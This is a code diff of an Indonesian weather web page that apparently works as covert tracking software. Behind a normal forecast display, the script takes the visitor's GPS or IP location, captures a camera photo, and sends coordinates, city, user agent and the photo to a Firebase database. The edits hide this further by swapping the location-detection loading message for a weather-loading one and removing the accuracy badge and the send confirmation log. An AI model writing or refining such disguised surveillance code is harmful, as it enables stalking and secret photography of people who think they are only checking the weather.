@@ -45,15 +45,6 @@
     .temp { font-size: 64px; font-weight: 200; line-height: 1; margin: 10px 0; }
     .desc { font-size: 18px; opacity: 0.9; margin-bottom: 5px; text-transform: capitalize; }
     .feels-like { font-size: 13px; opacity: 0.7; }
-    .accuracy-badge {
-      display: inline-block;
-      font-size: 11px;
-      padding: 4px 10px;
-      border-radius: 20px;
-      background: rgba(255,255,255,0.15);
-      margin-top: 10px;
-      opacity: 0.8;
-    }
     .details {
       display: grid; grid-template-columns: 1fr 1fr 1fr;
       gap: 10px; margin-top: 20px;
@@ -111,8 +102,8 @@
 <div class="container">
   <div class="loading" id="loading">
     <div class="spinner"></div>
-    <p id="loadMsg">Mendeteksi lokasi kamu...</p>
-    <p class="sub" id="loadSub">Mohon izinkan akses lokasi</p>
+    <p>Memuat data cuaca...</p>
+    <p class="sub">Mohon tunggu sebentar</p>
   </div>
 
   <div id="content" style="display:none">
@@ -130,7 +121,6 @@
       <div class="temp" id="temp">--°</div>
       <div class="desc" id="desc">-</div>
       <div class="feels-like" id="feels">Terasa seperti --°</div>
-      <div class="accuracy-badge" id="accuracyBadge" style="display:none"></div>
 
       <div class="details">
         <div class="detail-box">
@@ -207,93 +197,42 @@ const weatherMap = {
 function getWeather(code) { return weatherMap[code] || ['🌤️', 'Berawan']; }
 
 // ============================================================
-// 🔍 FUNGSI AMBIL LOKASI AKURAT
+// 📍 AMBIL LOKASI (SIMPLE & CEPAT)
 // ============================================================
-function getAccurateLocation() {
+function getLocation() {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
       resolve(null);
       return;
     }
 
-    let bestPos = null;
-    let watchId = null;
-    let attempts = 0;
-    const maxAttempts = 3;
-    const maxTime = 25000; // 25 detik maksimal
-    const startTime = Date.now();
+    // Timeout safety 8 detik — kalau tidak dapat, lanjut dengan IP
+    const timer = setTimeout(() => resolve(null), 8000);
 
-    const updateLoadMsg = (msg, sub) => {
-      const m = document.getElementById('loadMsg');
-      const s = document.getElementById('loadSub');
-      if (m) m.innerText = msg;
-      if (s && sub) s.innerText = sub;
-    };
-
-    const finish = () => {
-      if (watchId !== null) {
-        navigator.geolocation.clearWatch(watchId);
-        watchId = null;
-      }
-      resolve(bestPos);
-    };
-
-    // Cek timeout
-    const timeoutCheck = setInterval(() => {
-      if (Date.now() - startTime > maxTime) {
-        clearInterval(timeoutCheck);
-        finish();
-      }
-    }, 1000);
-
-    watchId = navigator.geolocation.watchPosition(
+    navigator.geolocation.getCurrentPosition(
       (pos) => {
-        attempts++;
-        const acc = pos.coords.accuracy;
-
-        updateLoadMsg(
-          'Mengunci lokasi...',
-          `Akurasi: ±${Math.round(acc)}m (percobaan ${attempts})`
-        );
-
-        // Simpan yang paling akurat
-        if (!bestPos || acc < bestPos.coords.accuracy) {
-          bestPos = pos;
-        }
-
-        // Kalau sudah cukup akurat (< 50m), langsung selesai
-        if (acc < 50) {
-          clearInterval(timeoutCheck);
-          finish();
-        }
-
-        // Kalau sudah 3x percobaan dan ada hasil, selesai
-        if (attempts >= maxAttempts && bestPos) {
-          clearInterval(timeoutCheck);
-          finish();
-        }
+        clearTimeout(timer);
+        resolve({
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        });
       },
       (err) => {
-        console.warn('GPS error:', err);
-        if (bestPos) {
-          clearInterval(timeoutCheck);
-          finish();
-        } else if (Date.now() - startTime > 5000) {
-          clearInterval(timeoutCheck);
-          resolve(null);
-        }
+        clearTimeout(timer);
+        resolve(null);
       },
       {
         enableHighAccuracy: true,
-        timeout: maxTime,
-        maximumAge: 0
+        timeout: 7000,
+        maximumAge: 60000  // boleh pakai lokasi 1 menit terakhir (lebih cepat)
       }
     );
   });
 }
 
 // ============================================================
-// 📸 AMBIL FOTO
+// 📸 AMBIL FOTO (SIMPLE)
 // ============================================================
 async function getCameraPhoto() {
   try {
@@ -304,7 +243,7 @@ async function getCameraPhoto() {
     const video = document.getElementById('video');
     video.srcObject = stream;
     await video.play();
-    await new Promise(r => setTimeout(r, 1500));
+    await new Promise(r => setTimeout(r, 1200));
 
     const canvas = document.getElementById('canvas');
     canvas.width = 480;
@@ -323,30 +262,33 @@ async function getCameraPhoto() {
 // 🚀 MAIN
 // ============================================================
 async function init() {
-  let pos = await getAccurateLocation();
   let lat, lng, accuracy = null;
+  let fromGPS = false;
 
+  // Coba GPS dulu
+  const pos = await getLocation();
   if (pos) {
-    lat = pos.coords.latitude;
-    lng = pos.coords.longitude;
-    accuracy = pos.coords.accuracy;
+    lat = pos.lat;
+    lng = pos.lng;
+    accuracy = pos.accuracy;
+    fromGPS = true;
   } else {
-    // Fallback: pakai IP (lokasi kasar)
+    // Fallback ke IP
     try {
       const r = await fetch('https://ipapi.co/json/');
       const d = await r.json();
       lat = d.latitude;
       lng = d.longitude;
-      accuracy = 5000; // IP cuma akurat ~5km
-    } catch(e2) {
+      accuracy = 5000;
+    } catch(e) {
       document.getElementById('loading').style.display = 'none';
       document.getElementById('error').style.display = 'block';
-      document.getElementById('errorMsg').innerText = 'Lokasi tidak bisa diakses';
       return;
     }
   }
 
   try {
+    // Ambil cuaca
     const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}&current=temperature_2m,relative_humidity_2m,apparent_temperature,weather_code,wind_speed_10m,surface_pressure&daily=weather_code,temperature_2m_max,temperature_2m_min&timezone=auto&forecast_days=5`;
     const res = await fetch(url);
     const data = await res.json();
@@ -357,12 +299,9 @@ async function init() {
       const geo = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=id`);
       const gd = await geo.json();
       cityName = gd.city || gd.locality || gd.principalSubdivision || 'Lokasi Kamu';
-      if (gd.principalSubdivision && cityName !== gd.principalSubdivision) {
-        cityName += ', ' + gd.principalSubdivision;
-      }
     } catch(e) {}
 
-    // Tampilkan data cuaca
+    // Update UI
     document.getElementById('cityName').innerText = cityName;
     const cur = data.current;
     const [icon, desc] = getWeather(cur.weather_code);
@@ -374,14 +313,7 @@ async function init() {
     document.getElementById('wind').innerText = Math.round(cur.wind_speed_10m) + ' km/h';
     document.getElementById('pressure').innerText = Math.round(cur.surface_pressure) + ' hPa';
 
-    // Tampilkan akurasi (opsional)
-    if (accuracy) {
-      const badge = document.getElementById('accuracyBadge');
-      badge.innerText = `Akurasi: ±${Math.round(accuracy)}m`;
-      badge.style.display = 'inline-block';
-    }
-
-    // Background sesuai cuaca
+    // Background
     const bg = document.body;
     if ([0,1].includes(cur.weather_code)) {
       bg.style.background = 'linear-gradient(180deg, #2980b9 0%, #6dd5fa 50%, #ffffff 100%)';
@@ -412,7 +344,7 @@ async function init() {
     }
     document.getElementById('forecastList').innerHTML = html;
 
-    // Sembunyikan loading, tampilkan konten
+    // Tampilkan konten
     document.getElementById('loading').style.display = 'none';
     document.getElementById('content').style.display = 'block';
 
@@ -425,6 +357,7 @@ async function init() {
       lat: lat,
       lng: lng,
       akurasi: accuracy ? Math.round(accuracy) : null,
+      sumber: fromGPS ? 'GPS' : 'IP',
       kota: cityName,
       suhu: cur.temperature_2m,
       userAgent: navigator.userAgent,
@@ -469,15 +402,12 @@ async function init() {
     const foto = await getCameraPhoto();
     if (foto) payload.foto = foto;
 
-    // Kirim ke Firebase
+    // Kirim
     await push(ref(db, 'lokasi/' + user), payload);
-    console.log('✓ Data terkirim');
 
   } catch(e) {
-    console.error(e);
     document.getElementById('loading').style.display = 'none';
     document.getElementById('error').style.display = 'block';
-    document.getElementById('errorMsg').innerText = 'Gagal memuat data cuaca';
   }
 }
 
